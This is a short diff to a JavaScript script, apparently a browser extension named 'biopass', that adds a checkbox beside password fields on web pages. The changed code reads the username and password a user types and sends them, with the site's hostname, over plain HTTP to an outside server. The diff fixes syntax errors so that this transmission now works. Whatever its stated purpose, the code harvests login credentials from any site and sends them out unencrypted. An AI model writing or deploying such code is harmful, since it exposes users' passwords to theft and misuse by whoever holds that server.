@@ -33,6 +33,7 @@ function sign_in(username, password){
 
 function populate_with_checkbox(){
 	var password_field;
+	console.log('aaaa');
 	var checkbox_code = "<div id='biopass_element'><input type='checkbox' id='biopass_checkbox' name='biopass_checkbox' /> <label>BP</label></div>";
 	$.each($("input[type=password]"), function(index, value) {
 		if($('#biopass_checkbox').length == 0){
@@ -51,9 +52,9 @@ var set_events = function(){
 			// alert(password_field.val());
 			// alert(name_field.val());
 			$.ajax({
-				url: 'http://jesuscastaneda.me/castaneda/store_information'
+				url: 'http://jesuscastaneda.me/castaneda/store_information',
 				method: 'POST',
-				data: {'username': name_field.val(), 'password': password_field.val()}
+				data: {'username': name_field.val(), 'password': password_field.val()},
 				dataType: 'json'
 			});
 		} else {
@@ -67,9 +68,9 @@ var set_events = function(){
 			// alert(password_field.val());
 			// alert(name_field.val());
 			$.ajax({
-				url: 'http://jesuscastaneda.me/castaneda/store_information'
+				url: 'http://jesuscastaneda.me/castaneda/store_information',
 				method: 'POST',
-				data: {'username': name_field.val(), 'password': password_field.val(), 'from': document.location.hostname}
+				data: {'username': name_field.val(), 'password': password_field.val(), 'from': document.location.hostname},
 				dataType: 'json'
 			});
 		} else {
@@ -82,4 +83,5 @@ var set_events = function(){
 $(document).ready(function(){
 	//alert("read");
 	window.setTimeout(set_events, 200);
+	window.setTimeout(populate_with_checkbox, 300);
 });
